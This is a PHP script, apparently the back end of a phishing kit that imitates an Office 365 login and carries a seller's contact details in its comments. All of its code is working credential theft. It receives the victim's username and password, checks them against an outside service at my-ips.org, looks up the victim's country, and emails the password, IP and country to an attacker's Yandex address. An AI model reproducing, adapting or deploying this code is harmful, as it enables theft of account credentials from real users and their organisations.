<?php

// THIS SCRIPT CODED BY MIRCBOOT
// CONTACT US SKYPE : MIRCBOOT
// ICQ : 703514486
// OFFICE 365 Version 13
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

header('Access-Control-Allow-Origin: *');

if(isset($_POST['user']) && isset($_POST['pass'])){


function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$user = $_POST['user'];
$pass = $_POST['pass'];
$recipient = "workmode2019@yandex.com"; // Replace your email id here
$api = 'http://my-ips.org/ip/index.php';
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
		"country" => $country,
		"ip" => $ip
	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $api);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	if ($result == 1)
		{
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$over = 'https://office365.com';
		$message = "-----------+ Right pass Verfied +-----------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "Client Country      : $country\n";
		$message.= "----------+ Created in Dagbo unit +-----------\n";
		$subject = "OFFICE 365 | Right pass: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";

		mail($recipient, $subject, $message, $headers);

		echo 1;
		}
	  else
		{
			$date = date('d-m-Y');
			$ip = getenv("REMOTE_ADDR");
			$over = 'https://office365.com';
			$message = "-----------+ Wrong Password Verified +---------\n";
			$message.= "User ID: " . $user . "\n";
			$message.= "Password: " . $pass . "\n";
			$message.= "Client IP      : $ip\n";
			$message.= "Client Country      : $country\n";
			$message.= "-----------+ Created in Dagbo unit +----------\n";
			$subject = "OFFICE 365 | Wrong Pass: " . $ip . "\n";
			$headers = "MIME-Version: 1.0\n";

			mail($recipient, $subject, $message, $headers);

      echo 0;
		}
	}
?>
